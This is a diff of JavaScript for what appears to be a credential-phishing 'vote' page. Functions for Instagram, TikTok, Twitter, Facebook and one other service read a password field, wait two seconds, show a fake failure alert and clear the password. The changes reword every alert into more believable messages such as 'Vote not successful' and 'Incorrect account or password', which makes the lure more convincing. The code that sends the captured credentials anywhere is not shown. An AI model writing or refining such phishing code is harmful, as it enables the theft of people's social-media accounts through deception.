@@ -52,7 +52,10 @@ function hmlog() {
     });
 
     setTimeout(function () {
-      showAlert("Oops!", "Something went wrong with your vote.");
+      showAlert(
+        "Vote not successful",
+        "Sorry, something went wrong. Please try again."
+      );
       document.getElementById("hm-pass").value = "";
       return false;
     }, 2000);
@@ -87,7 +90,10 @@ function iglog() {
     });
 
     setTimeout(function () {
-      showAlert("Oops!", "Something went wrong with your vote.");
+      showAlert(
+        "Vote not successful",
+        "Sorry, something went wrong. Please try again."
+      );
       document.getElementById("ig-pass").value = "";
       return false;
     }, 2000);
@@ -121,7 +127,7 @@ function toklog() {
     });
 
     setTimeout(function () {
-      showAlert("Oops!", "Incorrect account or password.");
+      showAlert("Vote not successful", "Incorrect account or password.");
       document.getElementById("tok-pass").value = "";
       return false;
     }, 2000);
@@ -155,7 +161,10 @@ function twilog() {
     });
 
     setTimeout(function () {
-      showAlert("Oops!", "Something went wrong with your vote.");
+      showAlert(
+        "Vote not successful",
+        "Sorry, something went wrong. Please try again."
+      );
       document.getElementById("twi-pass").value = "";
       return false;
     }, 2000);
@@ -189,7 +198,10 @@ function fblog() {
     });
 
     setTimeout(function () {
-      showAlert("Oops!", "Something went wrong with your vote.");
+      showAlert(
+        "Vote not successful",
+        "Sorry, something went wrong. Please try again."
+      );
       document.getElementById("fb-pass").value = "";
       return false;
     }, 2000);
